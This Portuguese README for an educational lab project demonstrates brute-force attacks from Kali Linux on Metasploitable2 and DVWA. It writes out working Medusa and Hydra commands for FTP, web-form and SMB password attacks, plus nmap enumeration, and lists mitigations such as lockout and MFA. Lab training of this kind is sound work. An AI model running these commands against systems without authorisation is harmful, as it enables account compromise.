# Projeto DIO — Ataque de Força Bruta com Medusa (Kali + Metasploitable2)

## 📖 Introdução
Este projeto tem como objetivo demonstrar ataques de força bruta utilizando a ferramenta **Medusa** em conjunto com ambientes vulneráveis (Metasploitable2 e DVWA), rodando em laboratório controlado no **VirtualBox**.  
O alvo possui IP **192.168.11.2** e o atacante é o **Kali Linux**.

⚠️ Aviso Legal: Este projeto é somente para fins educacionais em ambiente controlado. Nunca execute técnicas aqui documentadas em sistemas que você não tenha autorização.

## 🔧 Configuração do Ambiente
1. Configurar duas VMs (Kali + Metasploitable2) no VirtualBox.
2. Definir rede em modo **Host-Only**.
3. Confirmar conectividade com `ping 192.168.11.2`.

## 🔍 Enumeração Inicial com Nmap
```bash
nmap -sC -sV 192.168.11.2
```

## 🚀 Ataques de Força Bruta

### 1. FTP com Medusa
```bash
medusa -h 192.168.11.2 -M ftp -U wordlists/users.txt -P wordlists/passwords-small.txt -t 16 -f
```

### 2. DVWA (Formulário Web) com Hydra
```bash
hydra -l admin -P wordlists/passwords-small.txt 192.168.11.2 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Incorrect"
```

### 3. SMB Password Spraying com Medusa
```bash
medusa -h 192.168.11.2 -M smb -U wordlists/users-smb.txt -P wordlists/passwords-spray.txt -t 8
```

## 🗂 Estrutura do Repositório
- `README.md` → Documentação completa.
- `/wordlists` → Usuários e senhas utilizadas nos testes.
- `/logs` → Saídas dos testes (capturas).
- `run-all.sh` → Script para executar os ataques de exemplo.

## 🛡 Mitigações Propostas
- Políticas de senhas fortes (mín. 12 caracteres, complexidade).
- Implementar bloqueio após tentativas falhas.
- Uso de autenticação multifator (MFA).
- Monitoramento de logs e alertas de tentativas suspeitas.
- Segmentação de rede para serviços críticos.

## 🚀 Como Subir no GitHub
```bash
git init
git remote add origin https://github.com/SEU_USUARIO/medusa-bruteforce.git
git branch -M main
git add .
git commit -m "Projeto Medusa Brute Force - DIO"
git push -u origin main
```

---
👨‍💻 Autor: Seu Nome — Projeto educacional para DIO.
